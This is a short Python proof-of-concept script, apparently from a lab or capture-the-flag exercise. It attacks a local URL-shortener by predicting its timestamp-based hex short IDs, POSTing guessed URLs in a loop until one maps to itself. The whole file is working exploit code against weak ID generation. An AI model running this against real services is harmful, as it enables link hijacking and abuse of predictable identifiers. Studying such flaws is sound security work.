import requests
import time

target_url = "http://127.0.0.1:5000"
skip = 0x5

try:
	while True:
		bftime = str(hex(int((time.time() * 1000) + skip))).replace("0x", "")
		req_url = f"{target_url}/{bftime}"
		req = requests.post(target_url, {"url" : req_url})
		short_url = req.text.split("<h1>Generated URL: <a href=\"/")[-1].split("\">")[0]
		gen_url = f"{target_url}/{short_url}"
		if gen_url == req_url:
			print(f"Vulnerable URL: {gen_url}")
			break
		else:
			print(f"URL for '{req_url}': '{gen_url}'")
except KeyboardInterrupt:
	print("")
	print("Interrupted")
except BaseException as e:
	print(f"Unhanled Exception: {e}")